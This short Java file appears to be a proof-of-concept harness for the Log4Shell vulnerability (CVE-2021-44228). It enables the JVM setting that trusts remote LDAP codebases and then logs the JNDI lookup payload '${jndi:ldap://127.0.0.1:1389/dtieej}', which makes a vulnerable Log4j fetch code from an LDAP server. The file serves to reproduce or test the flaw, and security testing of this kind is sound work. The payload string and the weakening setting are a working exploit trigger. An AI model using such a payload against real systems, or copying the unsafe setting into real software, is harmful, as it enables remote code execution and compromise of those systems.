package org.payload.log4j.cve_2021_44228;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class CVE_2021_44228_JNDI {
    private static final Logger logger = LogManager.getLogger(CVE_2021_44228_JNDI.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/dtieej}");
    }
}